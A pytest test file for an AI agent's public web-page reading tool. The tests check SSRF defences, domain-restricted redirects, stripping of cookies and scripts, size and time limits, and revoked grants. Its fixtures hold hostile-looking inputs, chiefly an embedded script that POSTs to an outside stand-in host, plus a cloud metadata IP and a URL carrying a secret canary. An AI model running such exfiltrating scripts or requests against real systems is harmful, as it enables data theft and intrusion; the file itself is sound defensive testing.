"""Public reads enforce current grants and bounded evidence without network I/O."""
import asyncio
import json
import socket

import httpx
import pytest

from aicl.agent_runtime import public_tools
from aicl.agent_runtime.contracts import RunDefinition, RuntimeLimits
from aicl.agent_runtime.public_tools import PublicPageReadTool
from aicl.agent_runtime.storage import Repository
from aicl.control.errors import AiclError


def prepared(build_env, handler, *, addresses=("8.8.8.8",)):
    env = build_env()
    auth, inst = env.new_instance(capabilities=("inference", "network.fetch"))
    with env.db.transaction() as conn:
        conn.execute("UPDATE agent_instance SET lifecycle='active',network_domains=? WHERE id=?",
                     (json.dumps(["public.example", "second.example"]), inst.id))
    repo = Repository(env.db, env.clock)
    definition = RunDefinition(objective="Read the supplied source", allowed_tools=["web.read"],
                               requirements=[{"id": "summary", "text": "Summarize the source"}])
    run = repo.create_run(auth, inst.id, "public-read-test", definition.model_dump(), RuntimeLimits().model_dump())
    lookups = []

    async def resolver(host, port, **kwargs):
        lookups.append(host)
        return [(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, "", (address, port)) for address in addresses]

    tool = PublicPageReadTool(repo, resolver=resolver, transport=httpx.MockTransport(handler))
    return env, auth, inst, run, tool, lookups


def response(body, **kwargs):
    return httpx.Response(200, headers={"content-type": "text/html", **kwargs}, stream=httpx.ByteStream(body))


def test_redirects_read_only_text_without_cookies_auth_or_subresources(build_env):
    requests = []

    def handler(request):
        requests.append(request)
        if len(requests) == 1:
            return httpx.Response(302, headers={"location": "https://second.example/article", "set-cookie": "private_session=never-send; Domain=second.example"})
        return response(b'<html><head><title>Public source</title><script>fetch("https://outside.example/write",{method:"POST"})</script></head>'
                        b'<body>Evidence <a href="/next">next source</a><img src="https://outside.example/image"></body></html>')

    env, auth, _, run, tool, lookups = prepared(build_env, handler)
    result = tool.execute_scoped({"url": "https://public.example/start"}, "read-1", auth, run["id"])
    assert result.payload["error"] is None
    assert result.payload["text"] == "Evidence next source"
    assert result.payload["title"] == "Public source"
    assert result.payload["url"] == "https://second.example/article"
    assert result.payload["links"] == [{"url": "https://second.example/next", "title": "next source"}]
    assert result.payload["instruction_authority"] == "untrusted_evidence"
    assert len(requests) == 2 and lookups == ["public.example", "second.example"]
    assert all(request.method == "GET" and "authorization" not in request.headers and "cookie" not in request.headers for request in requests)
    assert result.usage.inference_input_tokens == result.usage.inference_output_tokens == result.usage.compute_minutes == 0


@pytest.mark.parametrize("target", ["https://outside.example/", "http://public.example/", "https://127.0.0.1/",
                                    "https://user:secret@public.example/", "https://public.example:8443/"])
def test_redirect_cannot_escape_approved_https_domains(build_env, target):
    calls = []

    def handler(request):
        calls.append(request)
        return httpx.Response(302, headers={"location": target})

    _, auth, _, run, tool, lookups = prepared(build_env, handler)
    assert tool.execute_scoped({"url": "https://public.example/"}, "read-1", auth, run["id"]).payload == {"error": "network_denied"}
    assert len(calls) == 1 and lookups == ["public.example"]


def test_mixed_dns_answers_block_before_transport(build_env):
    def unexpected(request):
        pytest.fail("Mixed private/public DNS must not reach transport")

    _, auth, _, run, tool, _ = prepared(build_env, unexpected, addresses=("8.8.8.8", "169.254.169.254"))
    assert tool.execute_scoped({"url": "https://public.example/"}, "read-1", auth, run["id"]).payload == {"error": "network_denied"}


def test_revoked_policy_and_cross_owner_scope_prevent_dispatch(build_env):
    calls = []

    def handler(request):
        calls.append(request)
        with env.db.transaction() as conn:
            conn.execute("UPDATE capability_grant SET enabled=0 WHERE instance_id=? AND capability='network.fetch'", (inst.id,))
        return httpx.Response(302, headers={"location": "/next"})

    env, auth, inst, run, tool, _ = prepared(build_env, handler)
    other_auth, _ = env.new_instance(capabilities=("inference", "network.fetch"))
    assert tool.execute_scoped({"url": "https://public.example/"}, "wrong-owner", other_auth, run["id"]).payload == {"error": "controls_changed"}
    assert calls == []
    assert tool.execute_scoped({"url": "https://public.example/"}, "read-1", auth, run["id"]).payload == {"error": "controls_changed"}
    assert len(calls) == 1
    with env.db.transaction() as conn:
        with pytest.raises(AiclError):
            tool.validate_scoped(conn, auth, run, {"url": "https://public.example/"})
        with pytest.raises(AiclError) as caught:
            tool.execute_scoped({"url": "https://public.example/"}, "inside-transaction", auth, run["id"])
        assert caught.value.error == "conflict"
    assert tool.execute_scoped({"url": "https://public.example/"}, "read-after-revoke", auth, run["id"]).payload == {"error": "controls_changed"}
    assert len(calls) == 1


def test_bounded_body_text_redirects_and_timeout(build_env, monkeypatch):
    pages = [response(b"x" * 100), response(b"x" * 100, **{"content-length": str(public_tools.MAX_RESPONSE_BYTES + 1)}),
             response(b"x" * (public_tools.MAX_RESPONSE_BYTES + 1)), response(b"x", **{"content-encoding": "gzip"})]
    _, auth, _, run, tool, _ = prepared(build_env, lambda request: pages.pop(0))
    first = tool.execute_scoped({"url": "https://public.example/", "max_chars": 10}, "read-1", auth, run["id"]).payload
    assert first["text"] == "x" * 10 and first["truncated"] is True
    for error in ("response_limit", "response_limit", "unsupported_encoding"):
        assert tool.execute_scoped({"url": "https://public.example/"}, "read-1", auth, run["id"]).payload == {"error": error}
    requests = []

    def loop(request):
        requests.append(request)
        return httpx.Response(302, headers={"location": "/again"})

    tool.transport = httpx.MockTransport(loop)
    assert tool.execute_scoped({"url": "https://public.example/"}, "read-1", auth, run["id"]).payload == {"error": "redirect_limit"}
    assert len(requests) == 4
    async def delayed_resolver(*args, **kwargs):
        await asyncio.sleep(1)

    tool.resolver = delayed_resolver
    monkeypatch.setattr(tool, "timeout_seconds", 0.01)
    assert tool.execute_scoped({"url": "https://public.example/"}, "read-1", auth, run["id"]).payload == {"error": "read_unavailable"}


@pytest.mark.parametrize("transport", [None, object()])
def test_withdrawn_page_read_denies_before_dns_or_http(build_env, monkeypatch, transport):
    calls = []
    env, auth, _, run, tool, lookups = prepared(build_env, lambda request: calls.append(request))
    tool.transport = transport
    def forbidden(*args, **kwargs):
        pytest.fail("Withdrawn page reads must fail before constructing a client or proxy")
    monkeypatch.setattr(httpx, "AsyncClient", forbidden)
    monkeypatch.setattr(public_tools, "PublicConnectProxy", forbidden)
    with pytest.raises(AiclError, match="denied"):
        tool.execute_scoped({"url": "https://public.example/collect?secret=PRIVATE-CANARY"}, "old-page", auth, run["id"])
    with env.db.reader() as conn:
        with pytest.raises(AiclError, match="denied"):
            tool.validate_scoped(conn, auth, run, {"url": "https://public.example/news"})
    assert calls == lookups == []


def test_mock_page_transport_without_mock_resolver_cannot_perform_real_dns(build_env):
    calls = []
    _, auth, _, run, tool, lookups = prepared(build_env, lambda request: calls.append(request))
    tool.resolver = None
    with pytest.raises(AiclError, match="denied"):
        tool.execute_scoped({"url": "https://public.example/news"}, "old-page", auth, run["id"])
    assert calls == lookups == []
